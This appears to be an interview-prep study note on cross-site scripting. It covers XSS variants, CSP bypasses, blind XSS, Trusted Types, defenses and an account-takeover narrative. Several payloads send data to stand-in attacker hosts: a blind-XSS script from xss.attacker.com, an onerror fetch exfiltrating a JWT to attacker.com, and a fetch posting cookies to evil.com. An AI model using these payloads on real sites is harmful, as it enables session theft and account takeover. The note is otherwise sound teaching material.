---
tags: [interview, web-security, qna, scenario]
difficulty: expert
module: "Interview Prep - Web Security"
topic: "QnA - Web Module 02"
---

# Web Security Interview Preparation: Module 02 - Cross-Site Scripting (XSS)

Welcome to the expert-level interview preparation guide for Cross-Site Scripting (XSS). This module focuses on the intricacies of one of the most prevalent vulnerabilities on the modern web. You will be evaluated on your understanding of execution contexts, modern browser security mechanisms, and complex bypass strategies.

XSS is no longer just about popping `alert(1)`. Modern exploitation involves session riding, complete DOM takeover, bypassing strict Content Security Policies (CSP), and manipulating complex frontend frameworks.

---

## Formal Technical Questions

### Q1: Detail the fundamental execution differences between Reflected, Stored, and DOM-based XSS. Why is DOM XSS specifically challenging for traditional WAFs to detect?
**Answer:**
The execution context and data flow dictate the categorization of XSS:
- **Reflected XSS:** The malicious payload is part of the HTTP request (usually in the URL parameters). The server receives the payload and immediately "reflects" it back in the HTTP response body without proper sanitization. The browser executes it upon rendering the response.
- **Stored XSS:** The malicious payload is permanently saved on the target server (e.g., in a database, log file, or message forum). When a victim navigates to the page serving that stored content, the server delivers the payload as part of the HTML. This is highly dangerous as it requires no interaction from the victim other than viewing a page.
- **DOM-based XSS:** The vulnerability exists entirely in the client-side JavaScript. The server never sees the malicious payload. The JavaScript reads data from a user-controllable source (like `window.location.hash` or `document.referrer`) and passes it securely to an unsafe sink (like `innerHTML` or `eval()`).
  - *WAF Evasion:* Because fragments (`#payload`) are never sent to the server in an HTTP request, a network-based WAF has zero visibility into the DOM XSS attack vector. The server logs will only show a request for the base page, making DOM XSS a favorite for stealthy exploitation.

### Q2: What is Mutation XSS (mXSS) and how does it exploit browser parsing behaviors?
**Answer:**
Mutation XSS occurs when an application correctly sanitizes input based on standard HTML parsing rules, but the browser subsequently mutates the DOM tree into an executable payload during the rendering or assignment process (often via `innerHTML`).
- *Mechanism:* Browsers attempt to fix broken or malformed HTML. For example, if a developer uses a trusted library to sanitize `<div title="<script>alert(1)</script>">`, it may pass as valid text within an attribute. However, if this string is later extracted and assigned to `innerHTML`, the browser's HTML parser might "correct" or mutate the HTML entities back into an active `<script>` block, bypassing the original sanitization entirely.
- *Impact:* It renders traditional server-side string filtering obsolete because the payload only becomes malicious *after* the browser processes the DOM.

### Q3: Explain the 'HttpOnly' flag for cookies. How can an attacker still leverage XSS if the session cookie is marked as HttpOnly?
**Answer:**
The `HttpOnly` flag is a security measure that instructs the browser to restrict access to the cookie via client-side scripts (e.g., `document.cookie` will return empty for that specific cookie). This prevents a simple XSS payload from exfiltrating the session token to an attacker-controlled server.
- *Exploitation despite HttpOnly:* If an attacker achieves XSS, they execute JavaScript within the context of the authenticated user's session. They do not *need* to steal the cookie. They can simply force the browser to make requests on behalf of the user. This is called **Session Riding**.
- *Techniques:* The attacker can write JavaScript that uses `fetch()` or `XMLHttpRequest` to read the user's private data (like CSRF tokens, PII) and exfiltrate *that* data, or issue POST requests to change the user's password, add an admin account, or transfer funds. The browser automatically attaches the `HttpOnly` cookie to these requests.

---

## Scenario-Based Questions

### Scenario 1: Bypassing Content Security Policy (CSP)
**Prompt:** You are on an engagement and find a Stored XSS injection point in a user profile description. However, execution is blocked by a strict CSP: `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';`. You cannot use inline scripts `<script>alert(1)</script>`. How do you proceed to achieve XSS?

**Expert Answer:**
The provided CSP restricts script execution exclusively to JavaScript files hosted on the exact same origin (`'self'`). I cannot use inline scripts or load scripts from an external domain. To bypass this, I would look for the following techniques:
1. **JSONP Endpoints:** I would spider the target application for JSONP endpoints. JSONP returns JavaScript execution based on a callback parameter. If I find `/api/user?callback=alert(1)`, I can inject `<script src="/api/user?callback=malicious_code"></script>`. Since the script is loaded from `'self'`, the CSP allows it, and the browser executes the returned code.
2. **File Uploads (Polyglots):** If the application allows file uploads (e.g., profile pictures, PDFs) and serves them from the same domain, I would craft an XSS polyglot payload—a file that acts as a valid image but also valid JavaScript. I inject `<script src="/uploads/my_malicious_image.jpg"></script>`. The CSP sees the `'self'` origin and permits execution.
3. **Open Redirects:** Some browsers incorrectly follow redirects when loading scripts. If there is an open redirect on the site, I might use `<script src="/redirect?url=http://attacker.com/payload.js"></script>`. (Note: Modern browsers have largely patched this specific CSP bypass, but it remains a legacy check).
4. **AngularJS / VueJS Template Injection:** If the site uses an older frontend framework, I can inject a template expression instead of a `<script>` tag. For instance, `{{constructor.constructor('alert(1)')()}}`. The framework's engine (which is loaded from `'self'`) evaluates the expression, achieving execution without violating the CSP.

### Scenario 2: Blind XSS in Administration Panels
**Prompt:** You are testing a bug bounty program. You find an input field in a "Contact Us" form. Testing standard payloads yields no reflection or execution. How do you test for, confirm, and exploit a potential Blind XSS vulnerability?

**Expert Answer:**
Blind XSS occurs when the payload is stored and executed in an environment the attacker cannot see, such as an internal CRM or admin dashboard.
1. **Testing & Confirmation:** I would utilize an Out-of-Band (OOB) payload generator like XSS Hunter, Burp Collaborator, or a custom webhook. The payload would look like: `"><script src=https://xss.attacker.com/c></script>`. I inject this into every conceivable field (Name, Email, Message, User-Agent header, Referer).
2. **Execution Context:** When the customer support agent opens the ticket in their internal dashboard, their browser executes the script. The script phones home to my server, bringing critical context: the URL of the admin panel, the internal IP structure, DOM HTML of the page, and session cookies.
3. **Exploitation:** Once confirmed, I modify the payload hosted on my server. The new payload will contain an asynchronous function (e.g., using `fetch`) to read the HTML of the admin panel, identify CSRF tokens, and automatically submit a request to create a new administrator account or alter the system configuration. The initial blind ping provides the reconnaissance needed to write the targeted exploitation script.

---

## Deep-Dive Defensive Questions

### D1: How does the Trusted Types API fundamentally change the way we defend against DOM XSS in modern web applications?
**Answer:**
Trusted Types is a revolutionary browser API designed to eliminate DOM XSS. Traditionally, preventing DOM XSS relies on developers remembering to manually sanitize data before passing it to an unsafe sink (like `innerHTML`).
- *The Paradigm Shift:* When Trusted Types are enforced (via CSP: `require-trusted-types-for 'script'`), the browser explicitly refuses to accept plain strings into dangerous sinks. 
- *Implementation:* `document.body.innerHTML = "<b>" + userInput + "</b>"` will throw a runtime error. Instead, developers must use a Trusted Type policy to explicitly sanitize the string and return a `TrustedHTML` object. `document.body.innerHTML = mySanitizerPolicy.createHTML(userInput)`. This enforces sanitization at the browser engine level, turning a developer mistake into a loud, fast-failing error rather than a silent vulnerability.

### D2: What are the optimal defense-in-depth strategies for mitigating XSS across a large, legacy web application where retrofitting Trusted Types or strict CSP is unfeasible?
**Answer:**
For legacy applications where modern browser features break functionality, defense must rely on layered server-side and client-side sanitization.
1. **Context-Aware Output Encoding:** This is the primary defense. Data must be encoded based on where it is being placed. Placing user data inside an HTML tag requires HTML entity encoding. Placing it inside a `<script>` block requires JavaScript unicode escaping. Using robust, context-aware templating engines (like Jinja2, React, or Razor) automatically handles this.
2. **Robust HTML Sanitization:** If the application requires accepting HTML (like a rich text editor), use established, actively maintained sanitization libraries like DOMPurify or server-side equivalents (e.g., Bleach). Never use regex to sanitize HTML.
3. **Defense via Headers:** Enforce `HttpOnly` and `Secure` flags on all sensitive cookies. Implement a baseline CSP to at least prevent inline scripts `script-src 'self'` and utilize `X-Content-Type-Options: nosniff` to prevent MIME-type confusion attacks that can lead to script execution.

---

## Real-World Attack Scenario

### The DOM XSS to Full Account Takeover via OAuth
During a red team engagement against a SaaS platform, I analyzed the login flow, which utilized OAuth 2.0. The callback URL contained a fragment identifier: `https://app.target.com/callback#access_token=xyz123&state=/dashboard`.
Analyzing the client-side JavaScript, I noticed the code extracted the `state` parameter from `window.location.hash` to determine where to redirect the user after a successful login. 
The vulnerable code snippet was: `document.getElementById('redirectMsg').innerHTML = "Redirecting to " + state_param;`.
This was a classic DOM XSS vulnerability. 

To weaponize this, I crafted an OAuth initiation URL where the `state` parameter was maliciously formatted: `state=<img src=x onerror=fetch('https://attacker.com/?t='+localStorage.getItem('jwt'))>`. 
I embedded this link in a spear-phishing email to the platform administrator. 
Upon clicking, the administrator authenticated normally via the IdP. The IdP redirected them back to the application with my malicious state parameter in the URL fragment. The DOM XSS triggered, bypassing the network WAF completely (since fragments aren't sent to the server), read their highly-privileged JWT from `localStorage`, and exfiltrated it to my server. Complete account takeover was achieved without ever requiring the user's password.

---

## Custom ASCII Diagram: DOM XSS Data Flow Architecture

```mermaid
sequenceDiagram
    participant A as Attacker Delivery
    participant V as Victim Interaction
    participant S as Web Server
    participant C as Client-Side Execution
    participant E as Exfiltration

    A->>V: Crafts Link:<br/>http://site.com/#<img src=x onerror=alert(1)>
    V->>S: Victim Clicks Link<br/>Browser sends GET Request to site.com
    Note right of V: (Fragment # is stripped)
    S-->>V: Returns generic static HTML page
    V->>C: Browser parses HTML and executes attached JavaScript.
    Note over C: JS code reads Source: window.location.hash<br/>var payload = window.location.hash.substring(1);<br/>document.getElementById('msg').innerHTML = payload;
    C->>E: Execution Sink hit! DOM mutates and executes the img tag.
    Note over E: Payload Executes!<br/>fetch('http://evil.com', {body: document.cookie})
```

---

## Chaining Opportunities
XSS is rarely the final goal; it is the perfect pivot point for deeper exploitation:
1. **XSS to CSRF:** Bypassing anti-CSRF tokens by using the XSS payload to request the token from a valid page, appending it to a forged request, and silently submitting it.
2. **XSS to RCE (Electron Apps):** If the web application is wrapped in an Electron client with `nodeIntegration` enabled, a simple web XSS can be escalated to full OS command execution via `require('child_process').exec()`.
3. **XSS to Keylogging:** Injecting JavaScript event listeners on form fields to capture keystrokes in real-time, exfiltrating passwords before they are even submitted.

---

## Related Notes
- [[04 - Session Management & Hijacking]]
- [[07 - Content Security Policy (CSP) Fundamentals]]
- [[12 - Advanced DOM Manipulation and Prototypes]]
- [[21 - Bypassing Client-Side Controls]]

